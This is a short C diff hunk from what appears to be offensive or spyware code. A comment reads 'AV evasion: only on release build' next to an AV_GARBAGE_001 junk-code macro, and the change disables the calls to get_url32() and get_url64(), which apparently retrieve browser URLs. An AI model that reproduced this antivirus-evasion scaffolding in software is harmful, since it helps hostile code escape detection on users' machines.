@@ -1106,12 +1106,12 @@ extern char *get_url64();
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  char *ff_url = get_url32();
+  char *ff_url = NULL;//get_url32();
 
   if(ff_url == NULL)
     {
       // Try to get url on 64bit headers
-      ff_url = get_url64();
+      //ff_url = get_url64();
 
       if (ff_url == NULL) 
         {
